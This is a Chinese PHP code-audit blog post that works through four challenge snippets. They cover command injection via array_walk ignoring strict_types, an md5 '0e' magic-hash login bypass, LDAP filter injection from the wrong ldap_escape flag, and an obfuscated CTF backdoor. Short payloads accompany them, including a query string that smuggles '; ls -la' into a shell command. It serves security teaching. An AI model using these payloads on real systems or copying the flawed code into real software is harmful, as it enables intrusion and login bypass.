<h2 id="Day-21-Gift-Wrap"><a href="#Day-21-Gift-Wrap" class="headerlink" title="Day 21 - Gift Wrap"></a>Day 21 - Gift Wrap</h2><h3 id="漏洞代码-10"><a href="#漏洞代码-10" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParamExtractor</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $validIndices = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">indices</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">    $validate = <span class="function"><span class="keyword">function</span> <span class="params">(int $value, $key)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> ($value &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;validIndices[] = $key;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      array_walk($input, $validate, <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (TypeError $error) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Only numbers are allowed as input"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;validIndices;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getCommand</span><span class="params">($parameters)</span> </span>&#123;</span><br><span class="line">    $indices = <span class="keyword">$this</span>-&gt;indices($parameters);</span><br><span class="line">    $params = [];</span><br><span class="line">    <span class="keyword">foreach</span> ($indices <span class="keyword">as</span> $index) &#123;</span><br><span class="line">      $params[] = $parameters[$index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> implode($params, <span class="string">' '</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$cmd = (<span class="keyword">new</span> ParamExtractor())-&gt;getCommand($_GET[<span class="string">'p'</span>]);</span><br><span class="line">system(<span class="string">'resizeImg image.png '</span> . $cmd);</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-10"><a href="#漏洞分析-10" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这是一道在运行在php7上的题目，题目本上的考察点比较少见，主要是利用了<code>array_walk()</code>的一个bug。php是一个弱类型的语言，在传入参数时并不会进行类型检查，甚至有时候还会进行隐式类型转换，很多时候由于开发人员的疏忽就会导致漏洞产生。在php7中就引入了<code>declare(strict_types=1);</code>这种声明方式，在进行函数调用的时候会进行参数类型检查。如果参数类型不匹配则函数不会被调用，这种方式就和诸如Java这类强类型的语言就是一样的了。如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int $a,int $b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $a+$b;</span><br><span class="line">&#125;</span><br><span class="line">$result = addnum(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">var_dump($result);              <span class="comment">// 输出3</span></span><br><span class="line">$result = addnum(<span class="string">'1'</span>,<span class="string">'2'</span>);</span><br><span class="line">var_dump($result);              <span class="comment">//出现Fatal error: Uncaught TypeError，Argument 1 passed to addnum() must be of the type integer, string given,程序出错，参数的数据类型不匹配</span></span><br></pre></td></tr></table></figure>
<p>按照php7的这种类型，那么最后通过<code>validate()</code>函数的就只有参数是大于0的，这样看来本题目是没有问题的。但是本题的关键是在于使用了<code>array_walk()</code>来调用<code>validate</code>函数。<strong>通过<code>array_walk()</code>调用的函数会忽略掉严格模式还是按照之前的php的类型转换的方式调用函数。</strong>。如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span>(strict_types=<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addnum</span><span class="params">(int &amp;$value)</span> </span>&#123;</span><br><span class="line">    $value = $value+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">$input = <span class="keyword">array</span>(<span class="string">'3a'</span>,<span class="string">'4b'</span>);</span><br><span class="line">array_walk($input,addnum);</span><br><span class="line">var_dump($input);</span><br></pre></td></tr></table></figure>
<p>最后得到的input数组是<code>array(4,5)</code>,所以说明了在使用<code>array_walk()</code>会忽略掉类型检查。</p>
<h3 id="漏洞验证-10"><a href="#漏洞验证-10" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>那么在本题目中，由于<code>array_walk()</code>的这种特性，导致我们可以传入任意字符进去，从而也可以造成命令执行了。最后的payload可以是<code>?p[1]=1&amp;p[2]=2;%20ls%20-la</code>。</p>
<h2 id="Day-22-Chimney"><a href="#Day-22-Chimney" class="headerlink" title="Day 22 - Chimney"></a>Day 22 - Chimney</h2><h3 id="漏洞代码-11"><a href="#漏洞代码-11" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">  setcookie(<span class="string">'hash'</span>, md5($_POST[<span class="string">'password'</span>]));</span><br><span class="line">  header(<span class="string">"Refresh: 0"</span>);</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$password = <span class="string">'0e836584205638841937695747769655'</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'hash'</span>])) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;form&gt;&lt;input type="password" name="password" /&gt;'</span></span><br><span class="line">  . <span class="string">'&lt;input type="submit" value="Login" &gt;&lt;/form &gt;'</span>;</span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">elseif</span> (md5($_COOKIE[<span class="string">'hash'</span>]) == $password) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Login succeeded'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Login failed'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-11"><a href="#漏洞分析-11" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>存在若比较，并且以0e开头的md5值，只需要找到其他0e开头的hash即可验证通过。</p>
<h3 id="漏洞验证-11"><a href="#漏洞验证-11" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=s878926199a</span><br></pre></td></tr></table></figure>
<h2 id="Day-23-Cookies"><a href="#Day-23-Cookies" class="headerlink" title="Day 23 - Cookies"></a>Day 23 - Cookies</h2><h3 id="漏洞代码-12"><a href="#漏洞代码-12" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LDAPAuthenticator</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $conn;</span><br><span class="line">  <span class="keyword">public</span> $host;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($host = <span class="string">"localhost"</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;host = $host;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">authenticate</span><span class="params">($user, $pass)</span> </span>&#123;</span><br><span class="line">    $result = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;conn = ldap_connect(<span class="keyword">$this</span>-&gt;host);</span><br><span class="line">    ldap_set_option(</span><br><span class="line">      <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">      LDAP_OPT_PROTOCOL_VERSION,</span><br><span class="line">      <span class="number">3</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!@ldap_bind(<span class="keyword">$this</span>-&gt;conn))</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    $user = ldap_escape($user, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">    $pass = ldap_escape($pass, <span class="keyword">null</span>, LDAP_ESCAPE_DN);</span><br><span class="line">    $result = ldap_search(</span><br><span class="line">      <span class="keyword">$this</span>-&gt;conn,</span><br><span class="line">      <span class="string">""</span>,</span><br><span class="line">      <span class="string">"(&amp;(uid=$user)(userPassword=$pass))"</span></span><br><span class="line">    );</span><br><span class="line">    $result = ldap_get_entries(<span class="keyword">$this</span>-&gt;conn, $result);</span><br><span class="line">    <span class="keyword">return</span> ($result[<span class="string">"count"</span>] &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"u"</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">  $ldap = <span class="keyword">new</span> LDAPAuthenticator();</span><br><span class="line">  <span class="keyword">if</span> ($ldap-&gt;authenticate($_GET[<span class="string">"u"</span>], $_GET[<span class="string">"p"</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You are now logged in!"</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Username or password unknown!"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="漏洞分析-12"><a href="#漏洞分析-12" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>本题主要是ldap的登录验证的代码，但是由于过滤函数使用不当而导致的任意用户登录的漏洞。</p>
<p>在题目中使用的过滤函数是<code>ldap_escape($user, null, LDAP_ESCAPE_DN)</code>。php手册上对第三个参数的说明如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ldap_escape ( string $value [, string $ignore = &quot;&quot; [, int $flags = 0 ]] ) : string</span><br><span class="line">Escapes value for use in the context implied by flags.</span><br><span class="line">参数 ¶</span><br><span class="line">value</span><br><span class="line">The value to escape.</span><br><span class="line"></span><br><span class="line">ignore</span><br><span class="line">Characters to ignore when escaping.</span><br><span class="line"></span><br><span class="line">flags</span><br><span class="line">The context the escaped string will be used in: LDAP_ESCAPE_FILTER for filters to be used with ldap_search(), or LDAP_ESCAPE_DN for DNs. If neither flag is passed, all chars are escaped.</span><br></pre></td></tr></table></figure>
<p>当使用<code>ldap_search()</code>时需要选择<code>LDAP_ESCAPE_FILTER</code>过滤字符串，但是本题中选择的是<code>LDAP_ESCAPE_DN</code>，这样就导致过滤无效。</p>
<h3 id="漏洞验证-12"><a href="#漏洞验证-12" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u=*&amp;p=123456</span><br></pre></td></tr></table></figure>
<h2 id="Day-24-Nutcracker"><a href="#Day-24-Nutcracker" class="headerlink" title="Day 24 - Nutcracker"></a>Day 24 - Nutcracker</h2><h3 id="漏洞代码-13"><a href="#漏洞代码-13" class="headerlink" title="漏洞代码"></a>漏洞代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@$GLOBALS=$GLOBALS&#123;next&#125;=next($GLOBALS&#123;<span class="string">'GLOBALS'</span>&#125;)</span><br><span class="line">  [$GLOBALS[<span class="string">'next'</span>][<span class="string">'next'</span>]=next($GLOBALS)[<span class="string">'GLOBALS'</span>]]</span><br><span class="line">  [$next[<span class="string">'GLOBALS'</span>]=next($GLOBALS[GLOBALS][<span class="string">'GLOBALS'</span>])</span><br><span class="line">  [$next[<span class="string">'next'</span>]]][$next[<span class="string">'GLOBALS'</span>]=next($next[<span class="string">'GLOBALS'</span>])]</span><br><span class="line">  [$GLOBALS[next][<span class="string">'next'</span>]($GLOBALS[<span class="string">'next'</span>]&#123;<span class="string">'GLOBALS'</span>&#125;)]=</span><br><span class="line">next(neXt($&#123;<span class="string">'next'</span>&#125;[<span class="string">'next'</span>]));</span><br></pre></td></tr></table></figure>
<p>这道题目是<code>Hack.lu CTF 2014: Next Global Backdoor</code>上的一道题目，具体的解答可以看<a href="https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/next-global-backdoor" target="_blank" rel="noopener">Hack.lu CTF 2014: Next Global Backdoor</a>，也有一篇中文文章的介绍<a href="http://drops.xmd5.com/static/drops/tips-3420.html" target="_blank" rel="noopener">Hack.lu 2014 Writeup</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Sys71m</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://www.sys71m.top/2020/02/14/PHP代码审计(二)/">https://www.sys71m.top/2020/02/14/PHP代码审计(二)/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PHP/">PHP</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/22/Apache Tomcat漏洞分析及复现(CVE-2020-1938)/"><i class="fa fa-chevron-left">  </i><span>Apache Tomcat漏洞分析及复现(CVE-2020-1938)</span></a></div><div class="next-post pull-right"><a href="/2020/02/13/PHP代码审计(一)/"><span>PHP代码审计(一)</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="disqus_thread"></div><script>var unused = null;
var disqus_config = function () {
  this.page.url = 'https://www.sys71m.top/2020/02/14/PHP代码审计(二)/';
  this.page.identifier = '2020/02/14/PHP代码审计(二)/';
  this.page.title = 'PHP代码审计(二)';
}
var d = document, s = d.createElement('script');
s.src = "https://" + 'sys71m' +".disqus.com/embed.js";
s.setAttribute('data-timestamp', '' + +new Date());
(d.head || d.body).appendChild(s);</script><script id="dsq-count-scr" src="https://sys71m.disqus.com/count.js" async></script></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/ttonys/MarkDownPic/master/test33.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2017 - 2020 By Sys71m</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>